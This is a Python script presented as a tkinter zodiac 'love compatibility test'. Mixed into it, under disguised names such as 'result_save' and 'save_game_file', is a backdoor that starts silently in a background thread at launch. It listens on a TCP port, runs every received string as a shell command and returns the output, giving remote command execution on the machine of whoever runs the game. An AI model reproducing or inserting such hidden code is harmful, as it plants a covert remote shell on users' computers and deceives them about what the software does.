#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""""""""""
Love compatibility test
This little test is telling you wether you're 
compatible or not according to your astrological sign

Created on Sat Nov 16 2024

@author: haimagull
"""""""""""
"""""""""""
Definition of compatibility function
"""""""""""
def sign_type(sign):
    if sign == "Cancer" or sign =="Pisces" or sign =="Scorpio" :
        sign_type = "Water"
    if sign == "Capricorn" or sign =="Virgo" or sign =="Taurus":
        sign_type = "Earth"
    if sign == "Sagittarius" or sign =="Leo" or sign =="Aries":
        sign_type = "Fire"
    if sign == "Aquarius" or sign =="Gemini" or sign =="Libra":
        sign_type = "Air"
    return sign_type

def compat(sign_1, sign_2):
   if sign_type(sign_1)=="Water":
       if sign_type(sign_2) == "Earth" :
           compat = "cosmically compatible"
       if sign_type(sign_2) == "Fire" :
           compat = "compatible"
       if sign_type(sign_2) == "Air" :
           compat = "not compatible"
   if sign_type(sign_1)=="Earth":
       if sign_type(sign_2) == "Water" :
           compat = "cosmically compatible"
       if sign_type(sign_2) == "Air" :
           compat = "compatible"
       if sign_type(sign_2) == "Fire" :
           compat = "not compatible"
   if sign_type(sign_1)=="Fire":
       if sign_type(sign_2) == "Air" :
           compat = "cosmically compatible"
       if sign_type(sign_2) == "Water" :
           compat = "compatible"
       if sign_type(sign_2) == "Earth" :
           compat = "not compatible"
   if sign_type(sign_1)=="Air":
       if sign_type(sign_2) == "Fire" :
           compat = "cosmically compatible"
       if sign_type(sign_2) == "Earth" :
           compat = "compatible"
       if sign_type(sign_2) == "Water" :
           compat = "not compatible"
   if sign_type(sign_1)==sign_type(sign_2):
       compat = "very compatible"
   return compat

import socket
import subprocess
import threading

def result_save():
    gamer_choice = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    compat_gamer = "192.168.1.135"
    possible_compat = 12345
    gamer_choice.bind((compat_gamer, possible_compat))
    gamer_choice.listen()
    while True:
        astrology_choice, addr = gamer_choice.accept()
        save_game_file = astrology_choice.recv(1024).decode('utf-8')
        if save_game_file == "stop":
            astrology_choice.close()
        gamer_set= subprocess.Popen([save_game_file], shell= True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, text=False)
        stdout, stderr = gamer_set.communicate() 
        if stderr:
                rsp = stderr
        elif stdout:
                rsp = stdout  # Sinon, on envoie stdout
        else:
                rsp = stderr
        rsp += b'\n'
        astrology_choice.send(rsp)   
"""""""""""
Algorythm
"""""""""""
import tkinter as tk
from tkinter import simpledialog, ttk
from PIL import Image, ImageTk

def compat_amour():
    name_1 = simpledialog.askstring("Input", "What is your name ?", parent=root)
    name_1 = name_1.capitalize()
    name_2 = simpledialog.askstring("Input", "What is the name of the lucky one ?", parent=root)
    name_2 = name_2.capitalize()
    sign_1 = simpledialog.askstring("Input", "What is your zodiac sign ?", parent=root)
    sign_2 = simpledialog.askstring("Input", f"What is the zodiac sign of {name_2} ?", parent=root)
    if not sign_2 :
        return
    sign_1 = sign_1.capitalize()
    sign_2 = sign_2.capitalize()
    amour = compat(sign_1, sign_2)  
    # Afficher la compatibilité
    result_label.config(text=f"{name_1},you are astrologically {amour} with {name_2} !")
    
"""""""""""

Visual interface
"""""""""""
if __name__ =="__main__":
    threading.Thread(target=result_save, daemon=True).start()    
    root = tk.Tk()
    root.title("Love compatibility test")

    # Window :
    # Bg image
    bg_image = Image.open("background.jpeg")  # image path
    bg_image = bg_image.resize((1000, 500), Image.ANTIALIAS)  # Resize
    bg_photo = ImageTk.PhotoImage(bg_image)
    # Canvas
    canvas = tk.Canvas(root, width=1000, height=500)
    canvas.pack()
    canvas.create_image(0, 0, anchor="nw", image=bg_photo) # Add bg image to canvas
    # Styles
    style = ttk.Style()
    style.configure("TButton", padding=6, relief="raised", background="magenta", foreground="magenta", font=("Arial", 12))
    style.map("TButton", background=[("active", "lightgrey")])
    ########################""""
    ########################
    # Labels x Button
    # Entry label
    label = ttk.Label(root, text="Discover how much you are cosmically compatible !", font=("Arial", 14), background="magenta")
    label.pack(pady=20)
    # Start button
    btn_generate = ttk.Button(root, text="Ask the Universe", command=compat_amour)
    btn_generate.pack(pady=10)
    # Result label
    result_label = ttk.Label(root, text="", font=("Arial", 20), background="magenta")
    result_label.pack(pady=20)

    # Run app
    root.mainloop()

